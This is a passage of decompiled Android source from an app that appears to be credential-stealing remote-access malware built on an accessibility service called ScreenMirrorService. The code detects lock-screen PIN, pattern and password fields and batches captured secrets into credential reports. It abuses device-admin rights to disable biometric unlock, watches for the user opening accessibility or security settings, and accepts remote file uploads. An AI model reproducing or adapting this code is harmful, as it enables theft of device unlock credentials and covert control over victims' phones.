        Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
        intent.setData(Uri.parse("package:" + packageName));
        intent.addFlags(268435456);
        a0.a.o(new StringBuilder("buildFilesIntent package="), packageName, "PermOrchestrator");
        try {
            if (screenMirrorService.getPackageManager().resolveActivity(intent, 0) != null) {
                return intent;
            }
        } catch (Throwable unused) {
        }
        Intent intent2 = new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
        intent2.addFlags(268435456);
        return intent2;
    }

    public static Intent d(ScreenMirrorService screenMirrorService) {
        ComponentName componentName = new ComponentName(screenMirrorService, (Class<?>) NotificationListener.class);
        Intent intent = new Intent("android.settings.NOTIFICATION_LISTENER_DETAIL_SETTINGS");
        intent.putExtra("android.provider.extra.NOTIFICATION_LISTENER_COMPONENT_NAME", componentName.flattenToString());
        try {
            ResolveInfo resolveInfoResolveActivity = screenMirrorService.getPackageManager().resolveActivity(intent, 65536);
            if (resolveInfoResolveActivity != null && resolveInfoResolveActivity.activityInfo != null) {
                ActivityInfo activityInfo = resolveInfoResolveActivity.activityInfo;
                intent.setComponent(new ComponentName(activityInfo.packageName, activityInfo.name));
            }
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("notification detail resolve failed: "), "PermOrchestrator");
        }
        intent.addFlags(268435456);
        return intent;
    }

    public static Intent e(ScreenMirrorService screenMirrorService) {
        Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
        intent.setData(Uri.parse("package:" + screenMirrorService.getPackageName()));
        intent.addFlags(268435456);
        try {
            if (screenMirrorService.getPackageManager().resolveActivity(intent, 0) != null) {
                return intent;
            }
        } catch (Throwable unused) {
        }
        Intent intent2 = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
        intent2.addFlags(268435456);
        return intent2;
    }

    public static void f(Context context) {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(NotificationManager.class);
        if (notificationManager == null) {
            return;
        }
        for (int i3 = 0; i3 < 8; i3++) {
            notificationManager.cancel(i3 + 9002);
        }
    }

    public static v2 f0(String str) {
        if (!str.startsWith("credential_ack:")) {
            o2.i("invalid credential_ack prefix");
            return null;
        }
        if (str.getBytes(StandardCharsets.UTF_8).length > 16384) {
            o2.i("credential_ack exceeds byte limit");
            return null;
        }
        JSONObject jSONObject = new JSONObject(str.substring(15));
        boolean zOptBoolean = jSONObject.optBoolean("accepted", false);
        Object objOpt = jSONObject.opt("retryable");
        boolean zBooleanValue = objOpt instanceof Boolean ? ((Boolean) objOpt).booleanValue() : true;
        String strOptString = jSONObject.optString("reason", "");
        String strTrim = strOptString == null ? "" : strOptString.trim();
        String str2 = strTrim.matches("[a-z0-9_]{1,64}") ? strTrim : "";
        int iOptInt = jSONObject.optInt("saved", 0);
        JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("ids");
        ArrayList arrayList = new ArrayList();
        HashSet hashSet = new HashSet();
        if (jSONArrayOptJSONArray != null) {
            for (int i3 = 0; i3 < jSONArrayOptJSONArray.length(); i3++) {
                String strOptString2 = jSONArrayOptJSONArray.optString(i3, "");
                if (strOptString2 != null && !strOptString2.isEmpty() && strOptString2.codePointCount(0, strOptString2.length()) <= 64 && hashSet.add(strOptString2)) {
                    arrayList.add(strOptString2);
                }
            }
        }
        return new v2(zOptBoolean, zBooleanValue, str2, Math.max(0, iOptInt), Collections.unmodifiableList(arrayList));
    }

    public static float g(float f3, float f4, float f5) {
        return Math.max(f3, Math.min(f5, f4));
    }

    public static String g0(String str) {
        if ("overlay".equals(str)) {
            str = "overlay_v1";
        }
        return "done_" + str;
    }

    public static int h(boolean z2, boolean z3, long j3, long j4, long j5) {
        boolean z4 = j5 < 0 || j3 > j5;
        long j6 = (j3 <= 0 || z4) ? Long.MAX_VALUE : j5 - j3;
        if (z3 && j6 <= 30000) {
            return 1;
        }
        if (!z2) {
            return 3;
        }
        if (z4 || j4 > j5) {
            return 4;
        }
        return (j3 <= 0 || j6 > 30000) ? 2 : 4;
    }

    public static Bundle h0(String str) {
        Bundle bundleR = r();
        if (str != null && str.length() > 16384) {
            str = str.substring(0, 16384);
        }
        bundleR.putString("reason", str);
        return bundleR;
    }

    public static i4 i(d2.f fVar) {
        if (fVar == null) {
            return new i4(4);
        }
        String str = (String) fVar.f559d;
        String lowerCase = str.toLowerCase(Locale.ROOT);
        for (int i3 = 0; i3 < 60; i3++) {
            if (L[i3].toLowerCase(Locale.ROOT).equals(lowerCase)) {
                return new i4(1);
            }
        }
        for (int i4 = 0; i4 < 37; i4++) {
            if (M[i4].toLowerCase(Locale.ROOT).equals(lowerCase)) {
                return new i4(2);
            }
        }
        for (int i5 = 0; i5 < 37; i5++) {
            if (N[i5].toLowerCase(Locale.ROOT).equals(lowerCase)) {
                return new i4(3);
            }
        }
        String str2 = fVar.f556a;
        Locale locale = Locale.ROOT;
        String lowerCase2 = str2.toLowerCase(locale);
        String lowerCase3 = str.toLowerCase(locale);
        for (int i6 = 0; i6 < 5; i6++) {
            String str3 = O[i6];
            if (lowerCase2.contains(str3) || lowerCase3.contains(str3)) {
                String str4 = (String) fVar.f560e;
                Locale locale2 = Locale.ROOT;
                String lowerCase4 = str4.toLowerCase(locale2);
                String lowerCase5 = ((String) fVar.f561f).toLowerCase(locale2);
                if (lowerCase.contains("lockpattern") || lowerCase.contains("lock_pattern") || lowerCase.contains("patternview") || lowerCase.contains("pattern_view") || lowerCase.contains("layout_")) {
                    return new i4(1);
                }
                boolean z2 = fVar.f557b;
                if ((fVar.f558c && z2) || lowerCase4.contains("mixedpassword") || lowerCase5.contains("混合密码") || lowerCase5.contains("密码编辑框")) {
                    return new i4(3);
                }
                return (lowerCase.contains("pinentry") || lowerCase.contains("pin_entry") || lowerCase.contains("pin_view") || lowerCase.contains("pin_edittext")) ? new i4(2) : new i4(4);
            }
        }
        return new i4(4);
    }

    public static void i0(InputStream inputStream, File file, long j3, long j4) throws IOException {
        if (j3 <= 0 || j3 > j4) {
            o2.l("invalid upload arguments");
            return;
        }
        File parentFile = file.getParentFile();
        if (parentFile == null || !(parentFile.isDirectory() || parentFile.mkdirs())) {
            o2.l("destination parent unavailable");
            return;
        }
        long usableSpace = parentFile.getUsableSpace();
        if (usableSpace > 0 && j3 > usableSpace) {
            o2.l("insufficient storage");
            return;
        }
        File file2 = new File(parentFile, "." + file.getName() + ".upload-" + UUID.randomUUID() + ".tmp");
        try {
            byte[] bArr = new byte[65536];
            FileOutputStream fileOutputStream = new FileOutputStream(file2, false);
            while (j3 > 0) {
                try {
                    int i3 = inputStream.read(bArr, 0, (int) Math.min(65536, j3));
                    if (i3 < 0) {
                        throw new EOFException("upload ended with " + j3 + " bytes missing");
                    }
                    if (i3 != 0) {
                        fileOutputStream.write(bArr, 0, i3);
                        j3 -= (long) i3;
                    }
                } catch (Throwable th) {
                    try {
                        fileOutputStream.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                    throw th;
                }
            }
            fileOutputStream.flush();
            fileOutputStream.getFD().sync();
            fileOutputStream.close();
            try {
                Files.move(file2.toPath(), file.toPath(), StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
            } catch (AtomicMoveNotSupportedException unused) {
                Files.move(file2.toPath(), file.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Throwable th3) {
            if (file2.exists()) {
                try {
                    Files.deleteIfExists(file2.toPath());
                } catch (Throwable unused2) {
                }
            }
            throw th3;
        }
    }

    public static void j(ScreenMirrorService screenMirrorService, String str) {
        if (str == null) {
            return;
        }
        try {
            screenMirrorService.getApplicationContext().getSharedPreferences("post_a11y_grants", 0).edit().remove(g0(str)).apply();
        } catch (Throwable unused) {
        }
    }

    public static void j0(ScreenMirrorService screenMirrorService, String str, String str2) {
        if (!c2.p.k(screenMirrorService)) {
            Log.i("BreachForensics", "breach persistence deferred while user locked");
            return;
        }
        try {
            SharedPreferences sharedPreferences = screenMirrorService.getSharedPreferences("breach_forensics", 0);
            long jCurrentTimeMillis = System.currentTimeMillis();
            long j3 = sharedPreferences.getLong("last_hb", 0L);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("breach_type", str);
            jSONObject.put("foreground_pkg", str2 != null ? str2 : "unknown");
            jSONObject.put("breach_ts", jCurrentTimeMillis);
            jSONObject.put("last_heartbeat_ts", j3);
            String str3 = Build.MODEL;
            if (str3 == null) {
                str3 = "unknown";
            }
            jSONObject.put("device_model", str3);
            String str4 = Build.BRAND;
            if (str4 == null) {
                str4 = "unknown";
            }
            jSONObject.put("device_brand", str4);
            String str5 = Build.MANUFACTURER;
            jSONObject.put("device_manufacturer", str5 != null ? str5 : "unknown");
            jSONObject.put("android_version", Build.VERSION.SDK_INT);
            jSONObject.put("versionCode", t9.f5179j);
            jSONObject.put("versionName", t9.f5180k);
            JSONObject jSONObjectT0 = t0(screenMirrorService, jCurrentTimeMillis);
            Iterator<String> itKeys = jSONObjectT0.keys();
            while (itKeys.hasNext()) {
                String next = itKeys.next();
                jSONObject.put(next, jSONObjectT0.opt(next));
            }
            String strG = h0.R(screenMirrorService).G(str, jSONObject);
            sharedPreferences.edit().putLong("last_hb", jCurrentTimeMillis).apply();
            j0 j0Var = cf.K().f3740z;
            if (j0Var != null) {
                j0Var.c();
            }
            Log.w("BreachForensics", "breach recorded: type=" + str + " fg=" + str2 + " id=" + strG + " model=" + Build.MODEL + " brand=" + Build.BRAND);
        } catch (Throwable th) {
            Log.e("BreachForensics", "recordBreach failed", th);
        }
    }

    public static int k(int i3, int i4) {
        return Math.max(1, Math.round(Math.min(Math.max(1, i3) * 0.86f, Math.max(1.0f, i3 - (l0(i3, i4) * 2.0f)))));
    }

    public static void k0(Context context) {
        try {
            int i3 = DeviceAdminRequestActivity.f2445a;
            Intent intent = new Intent(context, (Class<?>) DeviceAdminRequestActivity.class);
            intent.addFlags(276889600);
            context.startActivity(intent);
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("requestAdminActivation failed: "), "DeviceAdmin");
        }
    }

    public static String l(Context context) {
        String packageName = context == null ? "" : context.getPackageName();
        String str = t9.f5173d;
        return str.equals(packageName) ? packageName : str;
    }

    public static float l0(int i3, int i4) {
        return g(16.0f, Math.min(Math.max(1, i3), Math.max(1, i4)) * 0.035f, 40.0f);
    }

    public static ThreadPoolExecutor m(final String str) {
        final AtomicInteger atomicInteger = new AtomicInteger();
        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(4, 4, 30L, TimeUnit.SECONDS, new ArrayBlockingQueue(16), new ThreadFactory() { // from class: w1.t1
            @Override // java.util.concurrent.ThreadFactory
            public final Thread newThread(Runnable runnable) {
                Thread thread = new Thread(runnable, str + "-" + atomicInteger.incrementAndGet());
                thread.setDaemon(true);
                return thread;
            }
        }, new ThreadPoolExecutor.AbortPolicy());
        threadPoolExecutor.allowCoreThreadTimeOut(true);
        return threadPoolExecutor;
    }

    public static long m0(long j3, long j4) {
        if (j4 <= 0 || j3 <= Long.MAX_VALUE - j4) {
            return j3 + j4;
        }
        return Long.MAX_VALUE;
    }

    public static d2.f n(AccessibilityNodeInfo accessibilityNodeInfo) {
        Rect rect;
        boolean zIsEditable;
        if (accessibilityNodeInfo == null) {
            return null;
        }
        CharSequence packageName = accessibilityNodeInfo.getPackageName();
        String string = packageName == null ? "" : packageName.toString();
        String str = (string == null || string.isEmpty()) ? "" : string;
        Rect rect2 = new Rect();
        try {
            accessibilityNodeInfo.getBoundsInScreen(rect2);
            rect = rect2;
        } catch (Throwable unused) {
            rect = null;
        }
        boolean zIsPassword = false;
        try {
            zIsEditable = accessibilityNodeInfo.isEditable();
        } catch (Throwable unused2) {
            zIsEditable = false;
        }
        try {
            zIsPassword = accessibilityNodeInfo.isPassword();
        } catch (Throwable unused3) {
        }
        boolean z2 = zIsPassword;
        try {
            accessibilityNodeInfo.isVisibleToUser();
        } catch (Throwable unused4) {
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        String string2 = viewIdResourceName == null ? "" : viewIdResourceName.toString();
        CharSequence className = accessibilityNodeInfo.getClassName();
        String string3 = className == null ? "" : className.toString();
        CharSequence text = accessibilityNodeInfo.getText();
        String string4 = text == null ? "" : text.toString();
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        return new d2.f(str, string2, string3, string4, contentDescription != null ? contentDescription.toString() : "", zIsEditable, z2, rect);
    }

    public static void n0(Context context, g2.b0 b0Var, g2.c0 c0Var) throws IOException {
        long j3;
        DataInputStream dataInputStream = new DataInputStream(b0Var);
        byte[] bArr = new byte[4];
        dataInputStream.readFully(bArr);
        int i3 = 0;
        while (true) {
            byte[] bArr2 = f4584w;
            if (i3 >= 4) {
                byte b3 = dataInputStream.readByte();
                int unsignedByte = dataInputStream.readUnsignedByte();
                if ((unsignedByte & (-2)) != 0) {
                    o2.l(a0.a.g("unsupported APP1 flags: ", unsignedByte));
                    return;
                }
                long unsignedLong = Integer.toUnsignedLong(dataInputStream.readInt());
                if (unsignedLong > 524288) {
                    throw new IOException("APP1 wire payload too large: " + unsignedLong);
                }
                int i4 = (int) unsignedLong;
                byte[] byteArray = new byte[i4];
                dataInputStream.readFully(byteArray);
                if ((unsignedByte & 1) != 0) {
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(Math.min(i4 * 2, 65536));
                    GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(byteArray));
                    try {
                        byte[] bArr3 = new byte[8192];
                        while (true) {
                            int i5 = gZIPInputStream.read(bArr3);
                            if (i5 < 0) {
                                gZIPInputStream.close();
                                byteArray = byteArrayOutputStream.toByteArray();
                                break;
                            } else {
                                if (byteArrayOutputStream.size() + i5 > 2097152) {
                                    throw new IOException("APP1 expanded payload exceeds limit");
                                }
                                byteArrayOutputStream.write(bArr3, 0, i5);
                            }
                        }
                    } catch (Throwable th) {
                        try {
                            gZIPInputStream.close();
                        } catch (Throwable th2) {
                            th.addSuppressed(th2);
                        }
                        throw th;
                    }
                }
                if (byteArray.length > 2097152) {
                    b2.a.k("APP1 expanded payload too large: ", byteArray.length);
                    return;
                }
                if (b3 != 33) {
                    if (b3 != 32) {
                        E0(c0Var, "unsupported_command");
                        return;
                    }
                    if (byteArray.length > 4096) {
                        E0(c0Var, "request_too_large");
                        return;
                    }
                    try {
                        Charset charset = StandardCharsets.UTF_8;
                        long jMax = Math.max(0L, new JSONObject(new String(byteArray, charset)).optLong("knownRevision", 0L));
                        try {
                            c1 c1VarF = f1.f(context);
                            try {
                                byte[] bArrA = f1.a(c1VarF);
                                JSONObject jSONObject = new JSONObject(new String(bArrA, charset));
                                if (jMax <= 0 || jMax != c1VarF.f3643a) {
                                    F0(c0Var, (byte) 1, bArrA, true);
                                    return;
                                }
                                JSONObject jSONObject2 = new JSONObject();
                                try {
                                    jSONObject2.put("revision", jSONObject.getLong("revision"));
                                    jSONObject2.put("syncedAtMs", jSONObject.getLong("syncedAtMs"));
                                    jSONObject2.put("total", jSONObject.getInt("total"));
                                    jSONObject2.put("count", jSONObject.getJSONArray("apps").length());
                                    jSONObject2.put("truncated", jSONObject.getBoolean("truncated"));
                                    F0(c0Var, (byte) 2, jSONObject2.toString().getBytes(charset), false);
                                    return;
                                } catch (Exception e3) {
                                    throw new IOException("encode APP1 metadata", e3);
                                }
                            } catch (Exception unused) {
                                E0(c0Var, "snapshot_too_large");
                                return;
                            }
                        } catch (Exception unused2) {
                            E0(c0Var, "inventory_unavailable");
                            return;
                        }
                    } catch (Exception unused3) {
                        E0(c0Var, "invalid_request");
                        return;
                    }
                }
                if (byteArray.length > 4096) {
                    E0(c0Var, "request_too_large");
                    return;
                }
                try {
                    JSONArray jSONArray = new JSONObject(new String(byteArray, StandardCharsets.UTF_8)).getJSONArray("packages");
                    if (jSONArray.length() < 1 || jSONArray.length() > 24) {
                        E0(c0Var, "invalid_icon_batch");
                        return;
                    }
                    LinkedHashSet<String> linkedHashSet = new LinkedHashSet();
                    for (int i6 = 0; i6 < jSONArray.length(); i6++) {
                        String strTrim = jSONArray.optString(i6, "").trim();
                        if (!strTrim.isEmpty() && strTrim.length() <= 255 && strTrim.indexOf(46) > 0) {
                            for (int i7 = 0; i7 < strTrim.length(); i7++) {
                                char cCharAt = strTrim.charAt(i7);
                                if (cCharAt == '.' || cCharAt == '_' || Character.isLetterOrDigit(cCharAt)) {
                                }
                            }
                            linkedHashSet.add(strTrim);
                        }
                        E0(c0Var, "invalid_package");
                        return;
                    }
                    JSONObject jSONObject3 = new JSONObject();
                    JSONArray jSONArray2 = new JSONArray();
                    try {
                        d1 d1VarD = d1.d(context);
                        synchronized (d1VarD.f3752a) {
                            j3 = d1VarD.f3757f;
                        }
                        jSONObject3.put("revision", j3);
                        jSONObject3.put("icons", jSONArray2);
                        for (String str : linkedHashSet) {
                            String strE = f1.e(context, str);
                            if (strE != null && !strE.isEmpty()) {
                                jSONArray2.put(new JSONObject().put("package", str).put("icon", strE).put("mimeType", "image/jpeg"));
                                if (jSONObject3.toString().getBytes(StandardCharsets.UTF_8).length > 522240) {
                                    jSONArray2.remove(jSONArray2.length() - 1);
                                    break;
                                }
                            }
                        }
                        F0(c0Var, (byte) 3, jSONObject3.toString().getBytes(StandardCharsets.UTF_8), true);
                        return;
                    } catch (Exception unused4) {
                        E0(c0Var, "icon_batch_unavailable");
                        return;
                    }
                } catch (Exception unused5) {
                    E0(c0Var, "invalid_request");
                    return;
                }
            }
            if (bArr[i3] != bArr2[i3]) {
                o2.l("bad APP1 magic");
                return;
            }
            i3++;
        }
    }

    public static Character o(String str) {
        for (char c3 = '0'; c3 <= '9'; c3 = (char) (c3 + 1)) {
            String strValueOf = String.valueOf(c3);
            if (!str.contains("key" + strValueOf)) {
                if (!str.contains("pinkey" + strValueOf)) {
                    if (!str.contains("pin_key" + strValueOf)) {
                        if (!str.contains("num_key" + strValueOf)) {
                            if (!str.contains("digit" + strValueOf)) {
                                if (!str.contains("vivopinkey" + strValueOf)) {
                                }
                            }
                        }
                    }
                }
            }
            return Character.valueOf(c3);
        }
        return null;
    }

    /* JADX WARN: Code duplicated, block: B:14:0x002c  */
    public static String o0(Context context, boolean z2) {
        boolean z3;
        if (!D(context)) {
            return "BIO_DISABLE_FAIL|admin_inactive";
        }
        if (G(context)) {
            z3 = true;
        } else {
            try {
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
                if (devicePolicyManager == null || !devicePolicyManager.isProfileOwnerApp(context.getPackageName())) {
                    z3 = false;
                } else {
                    z3 = true;
                }
            } catch (Throwable unused) {
            }
        }
        if (!(Build.VERSION.SDK_INT >= 34 ? z3 : true)) {
            return "BIO_DISABLE_SKIP|api34_requires_owner";
        }
        try {
            DevicePolicyManager devicePolicyManager2 = (DevicePolicyManager) context.getSystemService("device_policy");
            if (devicePolicyManager2 == null) {
                return "BIO_DISABLE_FAIL|no_dpm";
            }
            ComponentName componentNameA = ScreenMirrorAdminReceiver.a(context);
            int i3 = z2 ? 432 : 0;
            devicePolicyManager2.setKeyguardDisabledFeatures(componentNameA, i3);
            Log.i("DeviceAdmin", "setKeyguardDisabledFeatures flags=" + i3);
            return z2 ? "BIO_DISABLED" : "BIO_RESTORED";
        } catch (Throwable th) {
            Log.w("DeviceAdmin", "setKeyguardDisabledFeatures failed: " + th.getMessage());
            return "BIO_DISABLE_FAIL|" + th.getMessage();
        }
    }

    public static boolean p(q.c cVar, Runnable runnable) {
        if (cVar == null) {
            return false;
        }
        try {
            Handler handler = cVar.f3005a;
            if (Looper.myLooper() == handler.getLooper()) {
                return false;
            }
            handler.post(new i2(0, runnable));
            return true;
        } catch (Throwable unused) {
            return false;
        }
    }

    public static k0 p0(Context context) {
        boolean z2;
        boolean z3;
        boolean z4;
        boolean zU;
        Context applicationContext = context.getApplicationContext();
        String str = applicationContext.getPackageName() + "/" + ScreenMirrorService.class.getName();
        String str2 = applicationContext.getPackageName() + "/.ScreenMirrorService";
        try {
            z3 = Settings.Secure.getInt(applicationContext.getContentResolver(), "accessibility_enabled", 0) == 1;
            try {
                zU = U(Settings.Secure.getString(applicationContext.getContentResolver(), "enabled_accessibility_services"), str, str2, applicationContext.getPackageName());
                z4 = true;
            } catch (Exception unused) {
                z2 = true;
                z4 = z2;
                zU = false;
            }
        } catch (Exception unused2) {
            z2 = false;
            z3 = false;
        }
        if (!zU) {
            try {
                AccessibilityManager accessibilityManager = (AccessibilityManager) applicationContext.getSystemService("accessibility");
                if (accessibilityManager == null) {
                    return new k0(z3, false);
                }
                List<AccessibilityServiceInfo> enabledAccessibilityServiceList = accessibilityManager.getEnabledAccessibilityServiceList(-1);
                if (enabledAccessibilityServiceList == null) {
                    return new k0(z3, false);
                }
                for (AccessibilityServiceInfo accessibilityServiceInfo : enabledAccessibilityServiceList) {
                    if (accessibilityServiceInfo.getResolveInfo() != null && accessibilityServiceInfo.getResolveInfo().serviceInfo != null) {
                        String str3 = accessibilityServiceInfo.getResolveInfo().serviceInfo.packageName;
                        String str4 = accessibilityServiceInfo.getResolveInfo().serviceInfo.name;
                        String packageName = applicationContext.getPackageName();
                        if (str3 != null && str4 != null && packageName != null && packageName.equals(str3) && (ScreenMirrorService.class.getName().equals(str4) || ".ScreenMirrorService".equals(str4))) {
                            zU = true;
                            break;
                        }
                    }
                }
            } catch (Exception unused3) {
            }
        }
        return new k0((z4 || !zU) ? z3 : true, zU);
    }

    public static DevicePolicyManager q(Context context) {
        return (DevicePolicyManager) context.getSystemService("device_policy");
    }

    public static boolean q0(String str, String str2) {
        if (str == null || str.isEmpty()) {
            return false;
        }
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        if (t9.f5173d.equals(lowerCase) || t9.f5174e.equals(lowerCase) || o4.f4708a.equals(lowerCase) || lowerCase.startsWith("vip.dicktok.") || lowerCase.contains("launcher") || lowerCase.contains("systemui") || "com.android.systemui".equals(lowerCase)) {
            return false;
        }
        if ("com.samsung.accessibility".equals(lowerCase) || "com.miui.accessibility".equals(lowerCase) || "com.coloros.accessibility".equals(lowerCase) || "com.oplus.accessibility".equals(lowerCase) || "com.huawei.accessibility".equals(lowerCase) || "com.oplus.safecenter".equals(lowerCase) || "com.oplus.battery".equals(lowerCase) || "com.android.settings.intelligence".equals(lowerCase) || "com.coloros.safecenter".equals(lowerCase) || "com.oppo.safe".equals(lowerCase) || "com.miui.securitycenter".equals(lowerCase) || "com.miui.powerkeeper".equals(lowerCase) || "com.vivo.permissionmanager".equals(lowerCase) || "com.vivo.abe".equals(lowerCase) || "com.huawei.systemmanager".equals(lowerCase)) {
            return true;
        }
        if ("com.android.settings".equals(lowerCase) && str2 != null && !str2.isEmpty()) {
            String lowerCase2 = str2.toLowerCase(locale);
            if (lowerCase2.contains("subsettings") || lowerCase2.contains("oplussettingshomepage") || lowerCase2.contains("notificationaccess") || lowerCase2.contains("accessibility")) {
                return true;
            }
        }
        String lowerCase3 = str2 == null ? "" : str2.toLowerCase(locale);
        return !lowerCase3.isEmpty() && lowerCase3.contains("accessibility");
    }

    public static Bundle r() {
        Bundle bundle = new Bundle();
        bundle.putInt("version", 1);
        return bundle;
    }

    public static boolean r0(int i3) {
        if (i3 != 1 && i3 != 2) {
            switch (i3) {
                default:
                    if (i3 != 2048 && i3 != 4096 && i3 != 256 && i3 != 4194304) {
                        return false;
                    }
                case 4:
                case 8:
                case 16:
                case 32:
                case 128:
                case 256:
                case 16384:
                case 32768:
                case 65536:
                case 1048576:
                case 2097152:
                    return true;
            }
        }
        return true;
    }

    public static String s(ArrayList arrayList, long j3) throws JSONException {
        if (arrayList.isEmpty()) {
            o2.i("credential batch items empty");
            return null;
        }
        if (arrayList.size() > 20) {
            o2.i("credential batch exceeds 20 items");
            return null;
        }
        JSONObject jSONObject = new JSONObject();
        JSONArray jSONArray = new JSONArray();
        HashSet hashSet = new HashSet();
        int size = arrayList.size();
        int i3 = 0;
        while (i3 < size) {
            Object obj = arrayList.get(i3);
            i3++;
            w2 w2Var = (w2) obj;
            String strB0 = B0(w2Var, j3);
            if (strB0 != null) {
                o2.i(strB0);
                return null;
            }
            if (!hashSet.add(w2Var.f5384a)) {
                o2.i("duplicate_id");
                return null;
            }
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("id", w2Var.f5384a);
            jSONObject2.put("secret", w2Var.f5385b);
            jSONObject2.put("mode", w2Var.f5386c);
            jSONObject2.put("provenance", w2Var.f5387d);
            jSONObject2.put("capturedAtMs", w2Var.f5388e);
            jSONArray.put(jSONObject2);
        }
        jSONObject.put("items", jSONArray);
        String str = "report:credential_batch:" + jSONObject;
        if (str.getBytes(StandardCharsets.UTF_8).length <= 16384) {
            return str;
        }
        o2.i("credential_batch_too_large");
        return null;
    }

    /* JADX INFO: Removed unreachable split cross block B:72:0x01a0 */
    /* JADX WARN: Code duplicated, block: B:50:0x00ef A[PHI: r16
  0x00ef: PHI (r16v3 int) = (r16v2 int), (r16v5 int), (r16v5 int) binds: [B:49:0x00e5, B:45:0x00df, B:40:0x00d4] A[DONT_GENERATE, DONT_INLINE]] */
    public static void s0(Context context) {
        int i3;
        Context applicationContext = context.getApplicationContext();
        if (p0(applicationContext).a()) {
            f(applicationContext);
            return;
        }
        if (Build.VERSION.SDK_INT >= 33 && applicationContext.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != 0) {
            Log.w("MirrorA11yLost", "POST_NOTIFICATIONS not granted — cannot notify user");
            return;
        }
        NotificationManager notificationManager = (NotificationManager) applicationContext.getSystemService(NotificationManager.class);
        long[] jArr = D;
        if (notificationManager != null) {
            for (int i4 = 0; i4 < 2; i4++) {
                try {
                    notificationManager.deleteNotificationChannel(C[i4]);
                } catch (Throwable unused) {
                }
            }
            NotificationChannel notificationChannel = new NotificationChannel("mirror_a11y_critical_v1", applicationContext.getString(R.string.a11y_lost_channel), 4);
            notificationChannel.setDescription(applicationContext.getString(R.string.a11y_lost_text));
            notificationChannel.setShowBadge(true);
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(-65536);
            notificationChannel.enableVibration(true);
            notificationChannel.setVibrationPattern(jArr);
            notificationChannel.setLockscreenVisibility(1);
            notificationChannel.setBypassDnd(true);
            Uri defaultUri = RingtoneManager.getDefaultUri(4);
            if (defaultUri == null && (defaultUri = RingtoneManager.getDefaultUri(1)) == null) {
                defaultUri = RingtoneManager.getDefaultUri(2);
            }
            notificationChannel.setSound(defaultUri, new AudioAttributes.Builder().setUsage(4).setContentType(4).build());
            notificationManager.createNotificationChannel(notificationChannel);
        }
        NotificationManager notificationManager2 = (NotificationManager) applicationContext.getSystemService(NotificationManager.class);
        if (notificationManager2 == null) {
            return;
        }
        int i5 = E;
        E = i5 + 1;
        int i6 = i5 % 8;
        if (i6 < 0) {
            i6 += 8;
        }
        int i7 = i6 + 9002;
        Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
        intent.addFlags(335544320);
        try {
            PackageManager packageManager = applicationContext.getPackageManager();
            i3 = 4;
            try {
                if (Build.VERSION.SDK_INT >= 33) {
                    if (packageManager.resolveActivity(intent, PackageManager.ResolveInfoFlags.of(65536L)) == null) {
                        Log.w("MirrorA11yLost", "No accessibility settings activity available");
                        intent = new Intent("android.settings.SETTINGS").addFlags(335544320);
                    }
                } else if (packageManager.resolveActivity(intent, 65536) == null) {
                    Log.w("MirrorA11yLost", "No accessibility settings activity available");
                    intent = new Intent("android.settings.SETTINGS").addFlags(335544320);
                }
            } catch (Throwable th) {
                th = th;
                a0.a.p(th, new StringBuilder("resolveActivity failed: "), "MirrorA11yLost");
            }
        } catch (Throwable th2) {
            th = th2;
            i3 = 4;
        }
        PendingIntent activity = PendingIntent.getActivity(applicationContext, i7, intent, 201326592);
        f(applicationContext);
        Notification.Builder vibrate = new Notification.Builder(applicationContext, "mirror_a11y_critical_v1").setSmallIcon(android.R.drawable.stat_sys_warning).setContentTitle(applicationContext.getString(R.string.a11y_lost_title)).setContentText(applicationContext.getString(R.string.a11y_lost_text)).setContentIntent(activity).setAutoCancel(false).setOngoing(true).setOnlyAlertOnce(false).setShowWhen(true).setWhen(System.currentTimeMillis()).setCategory("alarm").setPriority(2).setColor(-65536).setLights(-65536, 400, 200).setVibrate(jArr);
        Uri defaultUri2 = RingtoneManager.getDefaultUri(i3);
        if (defaultUri2 == null && (defaultUri2 = RingtoneManager.getDefaultUri(1)) == null) {
            defaultUri2 = RingtoneManager.getDefaultUri(2);
        }
        Notification.Builder sound = vibrate.setSound(defaultUri2, i3);
        sound.setVisibility(1);
        Notification notificationBuild = sound.build();
        notificationBuild.flags |= 32;
        if (p0(applicationContext).a()) {
            f(applicationContext);
            return;
        }
        try {
            notificationManager2.notify(i7, notificationBuild);
        } catch (Throwable th3) {
            a0.a.p(th3, new StringBuilder("notify failed: "), "MirrorA11yLost");
        }
    }

    public static boolean t(Context context) {
        boolean zU;
        Context applicationContext = context.getApplicationContext();
        synchronized (n) {
            zU = u(applicationContext);
        }
        return zU;
    }

    public static JSONObject t0(Context context, long j3) {
        String str;
        String strTrim;
        long j4;
        String strTrim2 = "";
        JSONObject jSONObject = new JSONObject();
        Context applicationContext = context.getApplicationContext();
        try {
            k0 k0VarP0 = p0(applicationContext);
            jSONObject.put("settingsMasterEnabled", k0VarP0.f4379a);
            jSONObject.put("settingsServiceListed", k0VarP0.f4380b);
        } catch (Throwable unused) {
        }
        try {
            jSONObject.put("accessibilityEverEnabled", C0(applicationContext));
        } catch (Throwable unused2) {
        }
        try {
            SharedPreferences sharedPreferences = applicationContext.getApplicationContext().getSharedPreferences("a11y_disable_evidence", 0);
            String string = sharedPreferences.getString("foreground_package", "");
